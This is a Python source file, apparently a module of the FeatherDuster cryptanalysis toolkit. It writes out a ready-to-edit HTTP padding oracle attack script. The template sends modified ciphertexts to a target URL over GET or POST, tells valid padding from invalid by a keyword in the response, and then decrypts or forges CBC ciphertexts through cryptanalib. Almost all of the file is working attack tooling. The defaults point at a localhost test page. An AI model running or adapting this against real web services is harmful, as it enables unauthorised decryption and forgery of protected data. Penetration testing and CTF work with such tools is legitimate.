import cryptanalib as ca
import feathermodules
import string

po_attack_script_skeleton = """# Generated by FeatherDuster
import cryptanalib as ca
import sys
# Requires python-requests module
import requests

if len(sys.argv) != 2:
   print '[*] Padding oracle attack script'
   print '[*] Usage: %%s <hex-encoded ciphertext or new plaintext>' %% sys.argv[0]
   exit()

def padding_oracle(ciphertext):
   # Encode the ciphertext before including it in the oracle query
   ciphertext = ciphertext.encode(%r)
   
   request = requests.%s('%s'%s)
   # If needed, modify the logic to identify good vs bad padding here:
   if %s in request.content:
      return False
   else:
      return True

# To decrypt the first command line argument:
print "The decrypted version of your input is: " + ca.padding_oracle_decrypt(padding_oracle=padding_oracle, ciphertext=sys.argv[1].decode('hex'), block_size=%r, padding_type=%r, iv=%r.decode('hex'), verbose=True, hollywood=%r)

# To encrypt the first command line argument:
# print "Your new ciphertext is: " + ca.cbcr(sys.argv[1].decode('hex'), oracle=padding_oracle, is_padding_oracle=True, block_size=%r, verbose=True)
"""

def generate_http_padding_oracle_attack_script(ciphertexts):
   options = dict(feathermodules.current_options)
   options = prepare_options(options, ciphertexts)
   if options == False:
      print '[*] Options could not be validated. Please try again.'
      return False
   try:
      print '[+] Attempting to write script...'
      fh = open(options['filename'], 'w')
      fh.write(po_attack_script_skeleton % (options['encoding'],options['method'],options['url'],options['post_body'],options['pad_error_keyword'],options['blocksize'],options['padding_type'],options['iv'],options['hollywood'],options['blocksize']))
      fh.close()
   except:
      print '[*] Couldn\'t write to the file with the name provided. Please try again.'
      return False
   print '[+] Done! Your script is available at %s' % options['filename']
   print '[+] The script as-is will not be functional, please edit the padding_oracle() function as described in the generated script.'
   return True

def prepare_options(options, ciphertexts):
   if options['method'].lower() == 'post':
      options['method'] = 'post'
   elif options['method'].lower() == 'get':
      options['method'] = 'get'
   else:
      print '[*] Only POST and GET are currently supported by this module.'
      return False

   if options['encoding'] not in ['hex','base64']:
      print '[*] Only hex and base64 encoding are currently supported by this module.'

   if '*' in options['url']:
      options['url'] = string.replace(options['url'],"'","\\'")
      options['url'] = string.replace(options['url'],'*',"'+ciphertext+'")

   if options['post_body'] != '':
      options['post_body'] = string.replace(options['post_body'],'*',"'+ciphertext+'")
      options['post_body'] = ",data='" + options['post_body'] + "'"

   if options['blocksize'] == 'auto':
      analysis_results = ca.analyze_ciphertext(ciphertexts)
      if analysis_results['blocksize'] == 0:
         print '[*] Couldn\'t detect a common blocksize.'
         return False
      options['blocksize'] = analysis_results['blocksize']
   else:
      try:
         options['blocksize'] = int(options['blocksize'])
      except:
         print '[*] Blocksize could not be interpreted as a number.'
         return False
   
   # We don't currently support any padding type but pkcs7
   options['padding_type'] = 'pkcs7'
   
   if options['iv'] == '':
      print '[+] No IV provided, defaulting to null block.'
      options['iv'] = '00'*options['blocksize']
   else:
      try:
         options['iv'].decode('hex')
      except:
         print '[*] IV was not in the correct format. Please provide a hex-encoded IV with length matching the blocksize.'
         return False
      if (len(options['iv'])/2) != options['blocksize']:
         print '[*] IV was not the correct length. Please provide a hex-encoded IV with length matching the blocksize.'
         return False
   
   options['hollywood'] = (options['hollywood'].lower() not in ['','n','no','no i am lame'])
 
   return options


feathermodules.module_list['http_padding_oracle'] = {
   'attack_function':generate_http_padding_oracle_attack_script,
   'type':'block',
   'keywords':['block'],
   'description':'Generate a basic HTTP/HTTPS padding oracle attack script (requires python-requests).',
   'options':{
      'filename':'http_padding_oracle_decrypt.py',
      'hollywood':'no',
      #'padding_type':'pkcs7',
      #'prefix':'',
      'method':'get',
      'url':'http://127.0.0.1/padding_oracle.php?vuln_param=*',
      'post_body':'param1=foo&vuln_param=*',
      'pad_error_keyword':'Padding Error',
      'encoding':'base64',
      'blocksize':'auto',
      'iv':''      
   }
}
